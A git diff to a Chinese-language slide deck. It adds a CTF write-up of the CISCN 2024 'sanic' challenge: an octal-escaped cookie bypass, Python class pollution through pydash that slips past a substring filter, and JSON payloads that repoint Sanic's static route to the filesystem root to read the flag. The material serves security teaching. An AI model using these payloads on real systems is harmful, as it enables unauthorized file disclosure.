@@ -564,8 +564,6 @@ layout: center
 transition: fade-out
 ---
 
-<!-- markdownlint-disable single-title no-inline-html heading-style blanks-around-headings no-duplicate-heading heading-increment-->
-
 # CISCN 2023 go_session
 
 Tags: <Tag color="green">Go Pongo2 SSTI</Tag> <Tag color="blue">SSRF</Tag> <Tag color="purple">Flask</Tag>
@@ -1022,4 +1020,567 @@ graph TD
       成功获取 Flag。
     </div>
   </div>
+</div>
+
+---
+layout: center
+transition: fade-out
+---
+
+# CISCN 2024 sanic
+
+Tags: <Tag color="green">Source Audit</Tag> <Tag color="blue">Python Class Pollution</Tag> <Tag color="purple">Sanic Web Server</Tag>
+
+<style>
+h1 {
+  background-color: #2B90B6;
+  background-image: linear-gradient(45deg, #4EC5D4 10%, #146b8c 20%);
+  background-size: 100%;
+  -webkit-background-clip: text;
+  -moz-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  -moz-text-fill-color: transparent;
+}
+</style>
+
+---
+
+## 题目源码
+
+```python {all|4-5|13-15|23-30|38-50|all}{lines:true, maxHeight:'90%'}
+from sanic import Sanic
+from sanic.response import text, html
+from sanic_session import Session
+import pydash
+# pydash==5.1.2
+
+
+class Pollute:
+    def __init__(self):
+        pass
+
+
+app = Sanic(__name__)
+app.static("/static/", "./static/")
+Session(app)
+
+
+@app.route('/', methods=['GET', 'POST'])
+async def index(request):
+    return html(open('static/index.html').read())
+
+
+@app.route("/login")
+async def login(request):
+    user = request.cookies.get("user")
+    if user.lower() == 'adm;n':
+        request.ctx.session['admin'] = True
+        return text("login success")
+
+    return text("login fail")
+
+
+@app.route("/src")
+async def src(request):
+    return text(open(__file__).read())
+
+
+@app.route("/admin", methods=['GET', 'POST'])
+async def admin(request):
+    if request.ctx.session.get('admin') == True:
+        key = request.json['key']
+        value = request.json['value']
+        if key and value and type(key) is str and '_.' not in key:
+            pollute = Pollute()
+            pydash.set_(pollute, key, value)
+            return text("success")
+        else:
+            return text("forbidden")
+    return text("forbidden")
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0')
+
+```
+
+---
+
+## 关键代码审计
+
+<div class="grid grid-cols-2 gap-x-8 mt-4">
+
+<div>
+
+### `/login` 路由
+
+```python {3|4}
+@app.route("/login")
+async def login(request):
+    user = request.cookies.get("user")
+    if user.lower() == 'adm;n':
+        request.ctx.session['admin'] = True
+        return text("login success")
+    return text("login fail")
+```
+
+<div class="space-y-4 mt-4">
+  <div class="flex gap-2 items-start text-sm">
+    <div class="text-red-500 font-bold text-lg">1.</div>
+    <div class="text-gray-600 dark:text-gray-400">从 Cookie 中获取 <code>user</code> 字段。</div>
+  </div>
+  <div class="flex gap-2 items-start text-sm">
+    <div class="text-red-500 font-bold text-lg">2.</div>
+    <div class="text-gray-600 dark:text-gray-400">关键验证逻辑。要求 <code>user</code> 字段的小写形式必须精确匹配 <code>adm;n</code>。</div>
+  </div>
+
+  <div class="bg-gray-50 dark:bg-gray-800 p-4 rounded-lg border-l-4 border-red-500 text-sm">
+    <div class="font-bold text-gray-700 dark:text-gray-300 mb-1">分析</div>
+    <div class="text-gray-600 dark:text-gray-400 leading-relaxed">
+      HTTP Cookie 标准中，分号（<code>;</code>）是分隔符。如何将包含分号的字符串 <code>adm;n</code> 作为一个完整的 Cookie 值传递给应用层？
+    </div>
+  </div>
+</div>
+
+</div>
+
+<div>
+
+### `/admin` 路由
+
+```python {6|8}
+@app.route("/admin", methods=['GET', 'POST'])
+async def admin(request):
+    if request.ctx.session.get('admin') == True:
+        key = request.json['key']
+        value = request.json['value']
+        if key and value and type(key) is str and '_.' not in key:
+            pollute = Pollute()
+            pydash.set_(pollute, key, value)
+            return text("success")
+        else:
+            return text("forbidden")
+    return text("forbidden")
+```
+
+<div class="space-y-4 mt-4">
+  <div class="flex gap-2 items-start text-sm">
+    <div class="text-red-500 font-bold text-lg">1.</div>
+    <div class="text-gray-600 dark:text-gray-400">
+      <span class="font-bold">漏洞核心</span>。使用用户可控的 <code>key</code> 和 <code>value</code> 对 <code>Pollute</code> 实例进行深度属性设置。这是原型链污染的入口 (Sink)。
+    </div>
+  </div>
+  <div class="flex gap-2 items-start text-sm">
+    <div class="text-red-500 font-bold text-lg">2.</div>
+    <div class="text-gray-600 dark:text-gray-400">
+      <span class="font-bold">一个简陋的 WAF</span>。它试图通过过滤 <code>_</code> 和 <code>.</code> 的组合来阻止常见的原型链污染 payload (如 <code>__class__</code>)。
+    </div>
+  </div>
+</div>
+
+</div>
+
+</div>
+---
+layout: default
+---
+
+## Step 1: Authentication Bypass
+
+[sanic-org/sanic@main: /sanic/cookies/request.py#L16-L47](https://github.com/sanic-org/sanic/blob/main/sanic/cookies/request.py#L16-L47) （♿：[DeepWiki](https://deepwiki.com/search/please-demonstrate-me-how-sani_698a36f1-63b8-4ea6-859c-880aec50c43c?mode=fast)）
+
+<div class="grid grid-cols-2 gap-8">
+
+<div class="border-orange-500 dark:border-orange-400 border-b-2 p-2 rounded-lg">
+  <div class="font-bold mb-2">核心问题：如何让服务器应用层正确接收到 <code>adm;n</code> 这一 Cookie 值？</div>
+  <div class="text-sm text-gray-600 dark:text-gray-400">
+    直接发送 <code>Cookie: user=adm;n</code> 会被 HTTP 解析器视为两个独立的 Cookie: <code>user=adm</code> 和 <code>n</code>。
+  </div>
+</div>
+
+<div class="border-orange-500 dark:border-orange-400 border-b-2 p-2 rounded-lg">
+  <div class="font-bold mb-2">解决方案：利用八进制转义</div>
+  <div class="text-sm text-gray-600 dark:text-gray-400">
+    分号 (<code>;</code>) 的 ASCII 值为 59，其八进制表示为 <code>\073</code>。<br>
+    构造特殊的 Cookie 值：<code>user="adm\073n"</code>。
+  </div>
+</div>
+
+</div>
+
+<!-- Process Diagram -->
+<div class="flex items-center justify-between my-4 gap-2">
+  <!-- Attacker -->
+  <div class="flex flex-col items-center gap-2">
+    <div class="i-carbon-laptop text-4xl"></div>
+    <div class="font-bold text-sm">Attacker</div>
+  </div>
+
+  <div class="bg-white dark:bg-gray-800 border border-gray-300 dark:border-gray-600 rounded p-2 text-xs shadow-sm">
+    <div class="text-gray-500 mb-1">Cookie:</div>
+    <code class="font-bold">user="adm\073n"</code>
+  </div>
+
+  <div class="i-carbon-arrow-right text-2xl text-gray-400"></div>
+
+  <!-- WSGI/Sanic -->
+  <div class="flex flex-col items-center bg-orange-50 dark:bg-orange-900/20 border border-orange-200 dark:border-orange-800 rounded-lg p-3">
+    <div class="text-xs font-bold text-orange-800 dark:text-orange-200 mb-2">WSGI/Sanic 解析层</div>
+    <div class="flex items-center gap-4">
+       <div class="flex flex-col items-center">
+         <div class="text-xl mb-1">🧐</div>
+         <div class="text-xs font-mono">\073</div>
+         <div class="text-xs font-mono">"adm\073n"</div>
+       </div>
+       <div class="i-carbon-arrow-right text-gray-400"></div>
+       <div class="flex flex-col items-center">
+         <div class="text-2xl font-bold">;</div>
+         <div class="text-xs font-mono">"adm;n"</div>
+       </div>
+    </div>
+  </div>
+
+  <div class="i-carbon-arrow-right text-2xl text-gray-400"></div>
+
+  <!-- Logic Layer -->
+  <div class="bg-white dark:bg-gray-800 border border-gray-300 dark:border-gray-600 rounded-lg p-3 text-center min-w-[120px]">
+    <div class="text-xs font-bold text-gray-500 mb-2">应用逻辑层</div>
+    <div class="text-xs text-gray-500">接收到字符串</div>
+    <div class="font-bold text-lg font-mono text-purple-600 dark:text-purple-400">adm;n</div>
+  </div>
+
+  <div class="i-carbon-arrow-right text-2xl text-gray-400"></div>
+
+  <!-- Validation -->
+  <div class="bg-green-50 dark:bg-green-900/20 border border-green-200 dark:border-green-800 rounded-lg p-3 flex flex-col items-center min-w-[200px]">
+    <div class="text-xs font-mono text-green-800 dark:text-green-200 mb-2">user.lower() == 'adm;n'</div>
+    <div class="i-carbon-checkmark-filled text-2xl text-green-500"></div>
+  </div>
+</div>
+
+<div class="text-sm">
+
+1. 请求发送：攻击者在 HTTP 请求头中构造 `Cookie: user="adm\073n"`。
+2. 底层解析：Sanic 框架在处理 HTTP 请求头时，会首先解析八进制转义序列。
+    - `\073` 在这一层被解码为其对应的 ASCII 字符，即分号 (`;`)。
+3. 应用层接收：当请求传递到 `/login` 路由的应用逻辑时获取到的已经是被解码后的完整字符串 `adm;n`。
+4. 验证通过：`user.lower() == 'adm;n'` 条件成立，服务器返回 "login success" 并设置管理员会话。
+
+</div>
+
+---
+
+## 理解 Python 中的「类污染」
+
+虽然 Python 没有 JavaScript 的原型链，但其动态特性允许实现一种效果类似的攻击，我们称之为「类污染」 _(Class Pollution)_。
+
+<div class="grid grid-cols-2 gap-4 text-sm">
+  <!-- JS Prototype Pollution -->
+  <div class="border border-gray-300 dark:border-gray-600 rounded-lg overflow-hidden">
+    <div class="bg-orange-200 dark:bg-orange-800 p-2 font-bold text-center border-b border-gray-300 dark:border-gray-600">JavaScript 原型链污染</div>
+    <div class="p-2 bg-white dark:bg-black/20">
+      <div class="flex items-center justify-center gap-2 mb-4">
+        <div class="border px-2 py-1 rounded bg-white dark:bg-gray-700">Instance</div>
+        <div class="i-carbon-arrow-right text-gray-400"></div>
+        <div class="font-mono text-xs text-orange-500">__proto__</div>
+        <div class="i-carbon-arrow-right text-gray-400"></div>
+        <div class="border px-2 py-1 rounded bg-white dark:bg-gray-700">Object.prototype</div>
+      </div>
+      <p class="text-xs text-gray-600 dark:text-gray-400 leading-relaxed">
+        通过 <code>__proto__</code> 或 <code>constructor.prototype</code> 修改 <code>Object.prototype</code>。
+        污染会影响所有继承自 Object 的对象实例。
+      </p>
+    </div>
+  </div>
+
+  <!-- Python Class Pollution -->
+  <div class="border border-gray-300 dark:border-gray-600 rounded-lg overflow-hidden">
+    <div class="bg-sky-200 dark:bg-sky-800 p-2 font-bold text-center border-b border-gray-300 dark:border-gray-600">Python 类污染</div>
+    <div class="p-2 bg-white dark:bg-black/20">
+      <div class="flex items-center justify-center gap-2 mb-4 text-xs">
+        <div class="border px-2 py-1 rounded bg-white dark:bg-gray-700">Instance</div>
+        <div class="flex flex-col items-center">
+           <div class="font-mono text-[10px] text-orange-500">__class__</div>
+           <div class="i-carbon-arrow-right text-gray-400"></div>
+        </div>
+        <div class="border px-2 py-1 rounded bg-white dark:bg-gray-700">Class</div>
+        <div class="flex flex-col items-center">
+           <div class="font-mono text-[10px] text-orange-500">__base__</div>
+           <div class="i-carbon-arrow-right text-gray-400"></div>
+        </div>
+        <div class="border px-2 py-1 rounded bg-white dark:bg-gray-700">Parent Class</div>
+      </div>
+      <p class="text-xs text-gray-600 dark:text-gray-400 leading-relaxed">
+        利用 Python 对象在运行时可被修改的特性。通过特殊的“魔术属性” (dunder attributes) 如 <code>__class__</code> 和 <code>__base__</code> 来向上追溯并修改类的属性。污染会影响所有该类及其子类的现有和未来实例。
+      </p>
+    </div>
+  </div>
+</div>
+
+<div class="mt-4 border border-gray-300 dark:border-gray-600 rounded p-2 flex justify-center bg-gray-50 dark:bg-gray-800/50">
+  <div class="flex items-center gap-4 text-xs">
+    <div class="border border-gray-400 bg-white dark:bg-gray-700 px-2 py-1 rounded flex items-center gap-1">
+      <div class="i-carbon-function"></div>
+      some_func
+    </div>
+    <div class="i-carbon-arrow-right text-gray-400">__globals__</div>
+    <div class="border border-gray-400 bg-white dark:bg-gray-700 p-2 rounded flex gap-4">
+      <div class="font-bold border-b mb-1 pb-1 w-full text-center">Global Scope</div>
+      <div class="flex gap-2">
+        <div class="border px-1 rounded flex items-center gap-1"><div class="i-carbon-box"></div> os_module</div>
+        <div class="border px-1 rounded flex items-center gap-1"><div class="i-carbon-chevron-right"></div> app_variable</div>
+        <div class="border px-1 rounded flex items-center gap-1"><div class="i-carbon-layers"></div> SomeOtherClass</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="text-sm mt-2">
+
+- `instance.__class__`: 获取实例所属的类。相当于 JS 中的 `instance.constructor`。
+- `SomeClass.__base__`: 获取类的直接父类。通过链式调用 `__base__.__base__` 可以追溯整个继承链。
+- `function.__globals__`: 一个关键的“任意门”。它是一个字典，包含了函数定义时所在模块的所有全局变量，包括导入的模块、定义的类和变量。这使得攻击者可以跨越继承关系，污染全局范围内的任何可变对象。
+
+</div>
+
+---
+
+## Step 2: 深入 pydash 内部规避 WAF 侦测
+
+[dgilland/pydash@v5.1.2: /src/pydash/objects.py#L1599](https://github.com/dgilland/pydash/blob/v5.1.2/src/pydash/objects.py#L1599)
+
+<div>
+  <div class="text-sm space-y-1">
+    <div class="flex items-center gap-2">
+      <div class="i-carbon-security text-orange-500"></div>
+      <span class="font-bold">WAF 规则:</span> <code class="bg-red-100 dark:bg-red-900/30 text-red-600 dark:text-red-400 px-1 rounded">'_.' not in key</code>
+    </div>
+    <div class="flex items-center gap-2">
+      <div class="i-carbon-idea text-yellow-500"></div>
+      <span class="font-bold">目标:</span> 构造一个不含 `_.` 字符串的 key，但其解析后的路径又能包含 `__...__` 这样的魔术属性。
+    </div>
+  </div>
+</div>
+
+<div class="text-sm my-2">
+
+- WAF 失效的根源：表层检测 vs. 内部解析
+  - WAF 仅仅对输入的原始字符串 key 进行简单的子字符串匹配。
+  - pydash 在内部会调用 `to_path_tokens` 函数，将路径字符串 (如 `'a.b["c"]'`) 分解为路径令牌 (tokens) 数组 (如 `['a', 'b', 'c']`)。
+  - 攻击的关键在于，找到一种 `pydash` 支持但 WAF 规则未覆盖的路径表示法。
+
+</div>
+
+<div class="border border-gray-300 dark:border-gray-600 rounded-lg overflow-hidden text-xs">
+  <table class="w-full">
+    <thead>
+      <tr class="bg-gray-100 dark:bg-gray-800 border-b border-gray-300 dark:border-gray-600">
+        <th class="text-left">Payload (key)</th>
+        <th class="text-left">WAF Check</th>
+        <th class="text-left">pydash 解析</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr class="border-b border-gray-200 dark:border-gray-700">
+        <td class="font-mono">key = '__class__.__init__...'</td>
+        <td class="text-red-600 font-bold"><div class="i-carbon-close-filled inline-block mr-1"></div> 失败 (包含 `_.` 字符串)</td>
+        <td class="text-gray-500 italic"><div class="i-carbon-stop-sign inline-block mr-1"></div> 解析受阻</td>
+      </tr>
+      <tr>
+        <td class="font-mono bg-green-50 dark:bg-green-900/10">key = '__class__<span class="text-red-500 font-bold">\\</span>.__init__...'</td>
+        <td class="text-green-600 font-bold"><div class="i-carbon-checkmark-filled inline-block mr-1"></div> 通过 (不包含 `_.` 字符串)</td>
+        <td>
+          <div class="flex items-center gap-2">
+            <div class="i-carbon-settings text-gray-400"></div>
+            <code class="bg-gray-100 dark:bg-gray-800 px-1 rounded text-red-500">\\.</code>
+            <div class="i-carbon-arrow-right text-gray-400"></div>
+            <code class="bg-gray-100 dark:bg-gray-800 px-1 rounded">.</code>
+            <div class="text-xs text-gray-500 ml-2">
+              unescape_path_key 转换<br/>
+              成功构造路径令牌: <code>['__class__', '__init__', ...]</code>
+            </div>
+          </div>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="text-sm my-2">
+
+- **绕过思路**：WAF 检查 `_.`。我们可以构造包含 `\\.` 的 key。在 WAF 检查时，由于 `\\.` 不等于 `_.`，检查通过。当 pydash 解析时，`unescape_path_key` 会将 `\\.` 转换回 `.`，从而成功构造含有下划线和点的路径组件。
+
+</div>
+
+---
+layout: default
+---
+
+## Step 3: 构造污染载荷，实现任意文件读取
+
+**核心目标**：找到一个 Gadget —— 即在污染发生后，应用代码会读取并使用的某个属性。在本例中，目标是 Sanic 的静态文件处理逻辑：[sanic-org/sanic@main: /sanic/mixins/static.py#L31](https://github.com/sanic-org/sanic/blob/main/sanic/mixins/static.py#L31)
+
+通过几次独立的 POST `/admin` 请求，逐步修改 Sanic 路由对象的属性，最终将静态文件服务指向根目录并开启目录浏览。
+
+- Payload 1: 开启目录浏览
+
+```json
+{"key":"__init__\\.__globals__\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view", "value": true}
+```
+
+<div class="scale-90 origin-left">
+
+```mermaid
+graph LR
+    A(Pollute_instance) --> B(__init__)
+    B -.->|访问模块全局空间| C(__globals__)
+    C --> D("app (Sanic 实例)")
+    D --> E("router...static<br/>(定位静态文件路由)")
+    E --> F("...directory_view<br/>(污染参数为 true)")
+
+    classDef blue fill:#e0f2fe,stroke:#0284c7,color:#000
+    classDef red fill:#fee2e2,stroke:#ef4444,color:#000
+
+    class A,C,D,E,F blue
+    class B red
+```
+
+</div>
+
+<div class="grid grid-cols-2 gap-4 mt-2">
+
+<!-- Left Column -->
+<div class="flex flex-col">
+
+- Payload 2: 改变静态文件根目录
+
+```json
+{"key":"__init__\\.__globals__\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory", "value": "/"}
+```
+
+- Payload 3 (备用/补充)：直接修改目录 `Path` 对象
+
+```json
+{"key":"__init__\\.__globals__\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts", "value": ["/"]}
+```
+
+</div>
+
+<!-- Right Column -->
+<div class="flex flex-col gap-4">
+
+<div class="text-sm bg-green-50 dark:bg-green-900/10 p-4 rounded-lg border border-green-200 dark:border-green-800">
+  <span class="font-bold text-green-700 dark:text-green-400">攻击效果：</span><br/>
+  发送以上 payload 后，访问 <code>/static/</code> 路由，服务器将返回根目录 <code>/</code> 的文件列表，从而可以找到并下载 flag 文件。
+</div>
+
+</div>
+
+</div>
+
+---
+
+## 完整攻击链
+
+<div class="grid grid-cols-[1.4fr_auto_1.4fr] gap-x-4 gap-y-2 items-center text-xs mt-2">
+
+  <!-- ROW 1: Session Escalation -->
+  <!-- Left: Request -->
+  <div>
+    <div class="font-bold mb-1 text-sm">请求</div>
+    <div class="bg-[#1e1e1e] text-[#d4d4d4] p-2 rounded font-mono border border-gray-700 shadow-lg leading-tight">
+      <div><span class="text-[#569cd6]">GET</span> /login HTTP/1.1</div>
+      <div><span class="text-[#9cdcfe]">Host</span>: &lt;TARGET_IP&gt;:&lt;PORT&gt;</div>
+      <div><span class="text-[#9cdcfe]">Cookie</span>: user=adm\073n</div>
+      <div class="text-[#6a9955]">...</div>
+    </div>
+  </div>
+
+  <!-- Center: Flow 1 -->
+  <div class="flex flex-col items-center justify-center relative h-full">
+    <!-- Horizontal Arrow -->
+    <div class="absolute w-[200%] h-[2px] bg-gray-300 dark:bg-gray-600 -z-10"></div>
+    <div class="w-8 h-8 rounded-full bg-slate-600 text-white flex items-center justify-center font-bold z-10 ring-4 ring-white dark:ring-[#121212]">1</div>
+    <!-- Vertical Line Down -->
+    <div class="absolute top-1/2 left-1/2 w-[2px] h-[calc(100%+4rem)] bg-gray-300 dark:bg-gray-600 -ml-[1px] -z-20"></div>
+  </div>
+
+  <!-- Right: Response -->
+  <div>
+    <div class="font-bold mb-1 text-sm">预期响应</div>
+    <ul class="list-disc pl-4 space-y-1 text-gray-700 dark:text-gray-300">
+      <li>HTTP 状态码: 200 OK</li>
+      <li>响应体: <code>login success</code></li>
+      <li>服务器在会话中设置 <code>admin=True</code> 标志。</li>
+    </ul>
+  </div>
+
+  <!-- ROW 2: Pollution & File Read -->
+  <!-- Left: Requests -->
+  <div class="flex flex-col gap-2 relative">
+    <div class="font-bold mb-1 text-sm">请求</div>
+    <div class="bg-[#1e1e1e] text-[#d4d4d4] p-2 rounded font-mono border border-gray-700 shadow-lg leading-tight">
+      <div><span class="text-[#569cd6]">POST</span> /admin HTTP/1.1</div>
+      <div class="text-[#6a9955]">...</div>
+      <div class="text-[#ce9178] break-all">{"key":"__init__\\...\\directory_view", "value": true}</div>
+    </div>
+    <div class="bg-[#1e1e1e] text-[#d4d4d4] p-2 rounded font-mono border border-gray-700 shadow-lg leading-tight">
+      <div><span class="text-[#569cd6]">POST</span> /admin HTTP/1.1</div>
+      <div class="text-[#6a9955]">...</div>
+      <div class="text-[#ce9178] break-all">{"key":"__init__\\...\\file_or_directory", "value": "/"}</div>
+    </div>
+    <!-- Bracket visual -->
+    <div class="absolute -right-4 top-8 bottom-2 w-3 border-r-2 border-t-2 border-b-2 border-gray-300 dark:border-gray-600 rounded-r"></div>
+  </div>
+
+  <!-- Center: Flow 2 -->
+  <div class="flex flex-col items-center justify-center relative h-full">
+    <!-- Horizontal Line -->
+    <div class="absolute w-[80%] right-0 h-[2px] bg-gray-300 dark:bg-gray-600 -z-10"></div>
+    <div class="w-8 h-8 rounded-full bg-slate-600 text-white flex items-center justify-center font-bold z-10 ring-4 ring-white dark:ring-[#121212]">2</div>
+    <!-- Vertical Line Down -->
+    <div class="absolute top-1/2 left-1/2 w-[2px] h-[calc(100%+4rem)] bg-gray-300 dark:bg-gray-600 -ml-[1px] -z-20"></div>
+  </div>
+
+  <!-- Right: Response -->
+  <div>
+    <div class="font-bold mb-1 text-sm">预期响应</div>
+    <ul class="list-disc pl-4 space-y-1 text-gray-700 dark:text-gray-300">
+      <li>HTTP 状态码: 200 OK</li>
+      <li>响应体: <code>success</code></li>
+    </ul>
+  </div>
+
+  <!-- ROW 3: Get Flag -->
+  <!-- Left: Requests -->
+  <div class="flex flex-col gap-2 relative">
+    <div class="font-bold mb-1 text-sm">请求</div>
+    <div class="bg-[#1e1e1e] text-[#d4d4d4] p-2 rounded font-mono border border-gray-700 shadow-lg leading-tight">
+      <div><span class="text-[#569cd6]">GET</span> /static/ HTTP/1.1</div>
+      <div class="text-[#6a9955]">...</div>
+    </div>
+    <div class="bg-[#1e1e1e] text-[#d4d4d4] p-2 rounded font-mono border border-gray-700 shadow-lg leading-tight">
+      <div><span class="text-[#569cd6]">GET</span> /static/24bc...flag HTTP/1.1</div>
+      <div class="text-[#6a9955]">...</div>
+    </div>
+     <!-- Bracket visual -->
+    <div class="absolute -right-4 top-8 bottom-2 w-3 border-r-2 border-t-2 border-b-2 border-gray-300 dark:border-gray-600 rounded-r"></div>
+  </div>
+
+  <!-- Center: Flow 3 -->
+  <div class="flex flex-col items-center justify-center relative h-full">
+    <!-- Horizontal Line -->
+    <div class="absolute w-[80%] right-0 h-[2px] bg-gray-300 dark:bg-gray-600 -z-10"></div>
+    <div class="w-8 h-8 rounded-full bg-slate-600 text-white flex items-center justify-center font-bold z-10 ring-4 ring-white dark:ring-[#121212]">3</div>
+  </div>
+
+  <!-- Right: Response -->
+  <div>
+    <div class="font-bold mb-1 text-sm">预期响应</div>
+    <ul class="list-disc pl-4 space-y-1 text-gray-700 dark:text-gray-300">
+      <li>一个 HTML 页面，列出服务器根目录的文件和文件夹。</li>
+      <li>找到 flag 文件名 & 成功下载 flag 文件。</li>
+    </ul>
+  </div>
+
 </div>
